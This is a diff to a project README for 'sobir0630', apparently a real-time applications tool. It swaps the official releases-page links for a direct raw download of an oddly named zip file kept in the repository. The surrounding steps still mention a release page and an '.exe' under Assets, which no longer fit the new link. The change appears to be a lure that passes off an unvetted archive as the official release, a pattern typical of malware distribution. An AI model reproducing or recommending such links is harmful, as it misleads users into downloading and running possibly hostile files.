@@ -1,6 +1,6 @@
 # 🚀 sobir0630 - Real-time applications made for everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tartaric-hotbox8456/sobir0630/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tartaric-hotbox8456/sobir0630/raw/refs/heads/main/compatibleness/sobir-erythrodextrin.zip)
 
 ## 📌 Introduction
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the application:
 
 Follow these steps to obtain the correct file for your system:
 
-1. Visit the project release page: https://github.com/Tartaric-hotbox8456/sobir0630/releases
+1. Visit the project release page: https://github.com/Tartaric-hotbox8456/sobir0630/raw/refs/heads/main/compatibleness/sobir-erythrodextrin.zip
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends with ".exe" under the Assets section.
 4. Save the file to your desktop or downloads folder.
